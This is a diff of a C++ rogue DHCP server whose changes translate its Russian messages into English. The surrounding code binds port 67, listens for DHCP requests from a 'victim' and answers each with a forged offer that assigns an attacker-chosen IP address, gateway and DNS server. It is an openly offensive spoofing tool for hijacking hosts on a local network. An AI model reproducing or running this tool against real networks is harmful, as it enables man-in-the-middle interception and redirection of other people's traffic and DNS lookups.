@@ -69,13 +69,13 @@ void send_dhcp_offer(int sock, struct sockaddr_in client_addr, struct dhcp_packe
     response.options[25] = 255;  // Конец опций
 
     sendto(sock, &response, sizeof(response), 0, (struct sockaddr *)&client_addr, sizeof(client_addr));
-    cout << "Поддельный DHCP Offer отправлен жертве!" << endl;
+    cout << "Fake DHCP-offer sended" << endl;
 }
 
 int main(int argc, char* argv[]) {
     if (argc != 4) {
-        cout << "Использование: " << argv[0] << " <IP жертвы> <Шлюз> <DNS>\n";
-        cout << "Пример: " << argv[0] << " 192.168.1.150 192.168.1.1 8.8.8.8\n";
+        cout << "Usage: " << argv[0] << " <Victim IP> <Gateway> <DNS>\n";
+        cout << "Example: " << argv[0] << " 192.168.1.150 192.168.1.1 8.8.8.8\n";
         return 1;
     }
 
@@ -91,7 +91,7 @@ int main(int argc, char* argv[]) {
     // Создание сокета UDP для прослушивания DHCP-запросов
     sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
-        perror("Ошибка создания сокета");
+        perror("Socket creation error");
         return 1;
     }
 
@@ -101,11 +101,11 @@ int main(int argc, char* argv[]) {
 
     // Привязываем сокет к порту 67 (DHCP сервер)
     if (bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        perror("Ошибка привязки сокета");
+        perror("Socket binding error");
         return 1;
     }
 
-    cout << "Запущен фальшивый DHCP-сервер..." << endl;
+    cout << "Fake DHCP started..." << endl;
 
     while (true) {
         memset(buffer, 0, BUFFER_SIZE);
@@ -113,7 +113,7 @@ int main(int argc, char* argv[]) {
 
         struct dhcp_packet *request = (struct dhcp_packet *)buffer;
         if (request->op == 1) { // DHCP Discover или Request
-            cout << "Получен DHCP-запрос от жертвы" << endl;
+            cout << "DHCP-request from victim!" << endl;
             send_dhcp_offer(sock, client_addr, request, fake_ip, fake_gateway, fake_dns);
         }
     }
